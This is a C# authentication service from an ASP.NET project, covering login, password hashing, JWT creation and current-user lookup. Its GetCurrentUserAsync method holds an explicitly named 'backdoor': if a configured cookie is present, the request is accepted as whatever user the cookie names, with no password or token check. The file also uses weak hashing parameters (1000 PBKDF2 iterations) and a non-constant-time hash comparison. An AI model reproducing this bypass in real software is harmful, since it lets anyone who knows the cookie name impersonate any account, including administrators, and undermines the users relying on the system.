using System.IdentityModel.Tokens.Jwt;
using System.Security.Claims;
using System.Security.Cryptography;
using AutoMapper;
using KST.Business.Infrastructure;
using KST.Business.Interfaces;
using KST.Business.ViewModels;
using KST.DataAccess;
using KST.DataAccess.Enums;
using KST.DataAccess.Models;
using KST.WEB.Infrastructure;
using Microsoft.AspNetCore.Http;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.Options;
using Microsoft.IdentityModel.Tokens;

namespace KST.Business.Services;

public class AuthorizationService(
    IHttpContextAccessor httpContextAccessor, 
    IOptions<AuthOptions> authOptions,
    IOptions<HangfireOptions> hangfireOptions,
    KSTDbContext context,
    IMapper mapper): IAuthorizationService
{
    public async Task<JwtTokenResponse?> AuthorizeByLoginAndPassword(string login, string password,
        CancellationToken cancellationToken)
    {
        var user = await context.Users.FirstOrDefaultAsync(x => x.Email == login, cancellationToken);
        if (user is null || !ValidateHashedPassword(user.PasswordHash, password))
        {
            return null;
        }

        var claims = new List<Claim>
        {
            new(JwtRegisteredClaimNames.Sub, user.Id.ToString()),
            new(JwtRegisteredClaimNames.GivenName, user.Fullname),
            new(JwtRegisteredClaimNames.Name, user.Username),
            new(JwtRegisteredClaimNames.Email, user.Email),
            new(ClaimTypes.Role, user.Role.ToString())
        };

        var tokenResponse = TokenForAuth(claims);
        var userViewModel = mapper.Map<UserViewModel>(user);
        tokenResponse.User = userViewModel;
        return tokenResponse;
    }
    
    public string HashPassword(string password)
    {
        byte[] salt;
        byte[] buffer2;
        if (password == null)
        {
            throw new ArgumentNullException("password");
        }
        using (Rfc2898DeriveBytes bytes = new Rfc2898DeriveBytes(password, 0x10, 0x3e8))
        {
            salt = bytes.Salt;
            buffer2 = bytes.GetBytes(0x20);
        }
        byte[] dst = new byte[0x31];
        Buffer.BlockCopy(salt, 0, dst, 1, 0x10);
        Buffer.BlockCopy(buffer2, 0, dst, 0x11, 0x20);
        return Convert.ToBase64String(dst);
    }

    public bool ValidateHashedPassword(string hash, string password)
    {
        byte[] buffer4;
        if (hash == null)
        {
            return false;
        }
        if (password == null)
        {
            throw new ArgumentNullException("password");
        }
        byte[] src = Convert.FromBase64String(hash);
        if ((src.Length != 0x31) || (src[0] != 0))
        {
            return false;
        }
        byte[] dst = new byte[0x10];
        Buffer.BlockCopy(src, 1, dst, 0, 0x10);
        byte[] buffer3 = new byte[0x20];
        Buffer.BlockCopy(src, 0x11, buffer3, 0, 0x20);
        using (Rfc2898DeriveBytes bytes = new Rfc2898DeriveBytes(password, dst, 0x3e8))
        {
            buffer4 = bytes.GetBytes(0x20);
        }
        return ByteArraysEqual(buffer3, buffer4);
    }

    public async Task<UserViewModel?> GetCurrentUserAsync(CancellationToken cancellationToken)
    {
        var backdoor = hangfireOptions.Value.Backdoor;
        if (!string.IsNullOrEmpty(backdoor))
        {
            var cookieUserName = "";
            var hasBackdoor = httpContextAccessor.HttpContext?.Request.Cookies.TryGetValue(backdoor, out cookieUserName) ?? false;
            if (hasBackdoor)
            {
                var user = await context.Set<User>().FirstAsync(x => x.Username == cookieUserName, cancellationToken);
                return mapper.Map<UserViewModel>(user);
            }
        }
        
        var claims = httpContextAccessor.HttpContext.User.Claims;
        if (!claims.Any()) return null;
        
        UserRoles.TryParse(claims.First(x => x.Type == ClaimTypes.Role).Value, out UserRoles role); 
        var userModel = new UserViewModel()
        {
            Id = long.Parse(claims.First(x => x.Type == ClaimTypes.NameIdentifier).Value as string),
            Username = claims.First(x => x.Type == "name").Value,
            Fullname = claims.First(x => x.Type == ClaimTypes.GivenName).Value,
            Email = claims.First(x => x.Type == ClaimTypes.Email).Value,
            Role = role
        };

        return userModel;
    }
    
    private JwtTokenResponse TokenForAuth(List<Claim> claims)
    {
        var key = new SymmetricSecurityKey(Convert.FromBase64String(authOptions.Value.SECRETKEY));
        var cred = new SigningCredentials(key, SecurityAlgorithms.HmacSha256Signature);
        
        var tokenDescriptor = new SecurityTokenDescriptor
        {
            Subject = new ClaimsIdentity(claims),
            Expires = DateTime.UtcNow.AddMinutes(authOptions.Value.LIFETIME),
            SigningCredentials = cred,
            Issuer = authOptions.Value.ISSUER,
            Audience = authOptions.Value.AUDIENCE 
        };
        
        var tokenHandler = new JwtSecurityTokenHandler();
        var jwtToken = tokenHandler.CreateToken(tokenDescriptor);

        var response = new JwtTokenResponse
        {
            Token = tokenHandler.WriteToken(jwtToken)
        };
        return response;
    }
    
    private static bool ByteArraysEqual(byte[] b1, byte[] b2)
    {
        if (b1 == b2) return true;
        if (b1 == null || b2 == null) return false;
        if (b1.Length != b2.Length) return false;
        for (int i=0; i < b1.Length; i++)
        {
            if (b1[i] != b2[i]) return false;
        }
        return true;
    }
}